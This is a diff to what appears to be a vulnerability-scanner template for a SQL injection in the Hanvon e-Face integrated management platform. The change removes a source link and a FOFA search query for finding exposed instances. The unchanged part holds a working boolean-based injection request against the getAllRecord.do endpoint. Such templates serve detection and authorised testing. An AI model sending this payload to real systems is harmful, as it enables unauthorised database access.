@@ -3,12 +3,8 @@ info:
   name: 汉王e脸通综合管理平台 getAllRecord存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/klq26n1ldth4vy9t'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: klq26n1ldth4vy9t
-    fofa: body="async src=\"/pwacompat.min.js" && body="minimum-scale=1" && body="window.routerBase"||title="汉王智慧园区"
 http:
 - raw:
   - 'GET /manage/patrolRecord/getAllRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=pr.SIGN_TIME+RLIKE+(SELECT+(CASE+WHEN+(2962%3d2962)+THEN+0x70722e5349474e5f54494d45+ELSE+0x28+END))%23+wAOm&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1 HTTP/1.1
